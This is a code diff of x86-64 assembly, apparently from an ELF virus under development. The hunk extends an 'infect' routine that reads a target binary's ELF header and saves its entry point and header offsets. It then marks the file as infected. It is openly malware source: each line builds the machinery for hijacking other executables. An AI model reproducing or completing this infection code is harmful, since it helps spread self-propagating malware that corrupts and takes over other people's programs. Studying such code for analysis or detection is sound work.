@@ -70,15 +70,47 @@ infect:
 	syscall
 	; ###########################################
 
-	sub rsp, 4096 ; BUF
+	; # MAKING SPACE FOR VARIABLES
+	sub rsp, 8 ;	PHDR_START		RBP - 8		QWORD
+	sub rsp, 8 ;	SHDR_START		RBP - 16	QWORD
+	sub rsp, 8 ;	HOST_ENTRY		RBP - 24	QWORD
+	sub rsp, 2 ;	PHNUM			RBP - 26	BYTE
+	sub rsp, 2 ;	SHNUM			RBP - 28	BYTE
+	sub rsp, 4096 ; BUF				RSP
+	; ############################
 
-	; # READ HEADER INFO
+	; # READ AND SAVE HEADER INFO
 	mov rax, 0 ; READ KERNEL CODE
 	mov rdi, r9 ; FD
 	lea rsi, [rsp] ; ADDR BUFFER
 	mov rdx, 0x40 ; SIZEOF(Elf64_Ehdr)
 	syscall
+
+	; # SAVE PHDR_START
+	mov rax, qword[rsp + 32]
+	mov qword[rbp-8], rax ; MOVE PHDR_START
+
+	; # SAVE SHDR_START
+	mov rax, qword[rsp + 40]
+	mov qword[rbp-16], rax ; MOVE SHDR_START
+
+	; # SAVE HOST_ENTRY
+	mov rax, qword[rsp + 24]
+	mov qword[rbp-24], rax ; MOVE HOST_ENTRY
+
+	; # SAVE PHNUM
+	mov al, byte[rsp + 56]
+	mov byte[rbp-26], al; MOVE PH_NUM
+
+	; # SAVE SHNUM
+	mov al, byte[rsp + 60]
+	mov byte[rbp-28], al ; MOVE SH_NUM
 	; #############################
+	
+	; # PARSE SEGMENTS
+	; int 3 ; # BREAKPOINT FOR DEBUG
+
+	; ################
 
 	call set_mark ; LET OUR INFECTED MARK
 
